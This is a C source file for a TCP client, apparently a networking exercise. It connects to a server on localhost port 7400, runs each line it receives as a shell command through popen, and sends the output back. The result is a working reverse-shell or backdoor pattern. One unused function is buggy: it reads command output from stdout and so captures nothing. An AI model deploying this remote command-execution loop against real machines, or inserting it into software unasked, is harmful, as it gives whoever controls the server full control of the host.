#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include "util.h"
#define MSG_SIZE 200
#define MAX_CLIENTS 150
#define MYPORT 7400
#define HOSTNAME "127.0.0.1"

void try_connect(int client_socket, struct sockaddr_in server_addr) {
  // Try connecting
  if (connect(client_socket, (struct sockaddr *)&server_addr,
              sizeof(server_addr)) < 0) {
    error_and_exit("Connection failed\n");
  }
}

FILE *get_socket_file(int client_socket) {
  FILE *socket_file = fdopen(client_socket, "r+");
  if (socket_file == NULL) {
    error_and_exit("Couldn't open socket as file stream\n");
  }
  return socket_file;
}

int command_recv(FILE *socket_file) {
  char *recv_line = NULL;
  size_t recv_line_size = 0;
  // Wait to receive a message from the server
  if (getline(&recv_line, &recv_line_size, socket_file) == -1) {
    printf("Error in receiving message\n");
    return -1;
  }

  // Read the output of the command and send it back to the server
  char output_buffer[4096]; // Adjust buffer size as needed

  system(recv_line);

  while (fgets(output_buffer, sizeof(output_buffer), stdout) != NULL) {
    printf("%s\n", output_buffer);
    if (fputs(output_buffer, socket_file) == EOF) {
      printf("Error sending response to server\n");
      free(recv_line);
      return -1;
    }
  }
  fflush(socket_file); // Ensure the data is sent immediately

  free(recv_line);

  return 0;
}

int test_recv_send(FILE *socket_file) {
  char *recv_line = NULL;
  size_t recv_line_size = 0;

  // Wait to receive a message from the server
  if (getline(&recv_line, &recv_line_size, socket_file) == -1) {
    printf("Error in receiving message\n");
    return -1;
  }

  // Execute the command given by the server and capture its output
  FILE *output_pipe = popen(recv_line, "r");
  if (!output_pipe) {
    printf("Error executing command\n");
    free(recv_line);
    return -1;
  }

  // Read the output of the command and send it back to the server
  char output_buffer[4096]; // Adjust buffer size as needed
  while (fgets(output_buffer, sizeof(output_buffer), output_pipe) != NULL) {
    printf("%s", output_buffer); // Print to console (optional)
    if (fputs(output_buffer, socket_file) == EOF) {
      printf("Error sending response to server\n");
      free(recv_line);
      pclose(output_pipe);
      return -1;
    }
  }
  fflush(socket_file); // Ensure the data is sent immediately
  pclose(output_pipe); // Close the output pipe
  free(recv_line);     // Clean up
  return 0;
}
int main(int argc, char *argv[]) {

  /*Client variables*/

  struct hostent *hostinfo;

  /*Client*/
  printf("\n*** Client program starting (enter \"quit\" to stop): \n");
  fflush(stdout);

  /* Create a socket for the client */
  int sockfd = open_tcp_socket();
  /* Name the socket, as agreed with the server */
  hostinfo = gethostbyname(HOSTNAME); /* look for host's name */
  // Make a sockaddr_in for binding/connecting
  struct sockaddr_in address = {
      .sin_family = AF_INET,
      .sin_port = (in_port_t)htons(MYPORT),
      .sin_addr = *(struct in_addr *)*hostinfo->h_addr_list,
  };

  /* Connect the socket to the server's socket */
  try_connect(sockfd, address);
  FILE *socket_file = get_socket_file(sockfd);
  int socket_file_status = 0;
  while (socket_file_status != -1) {
    socket_file_status = test_recv_send(socket_file);
  }

  if (!feof(stdin) && !feof(socket_file)) {
    error_and_exit("Error reading or writing line:");
  }

  // Clean up and exit.
  printf("Closing TCP");
  close_tcp_socket(sockfd);
  return 0;
}
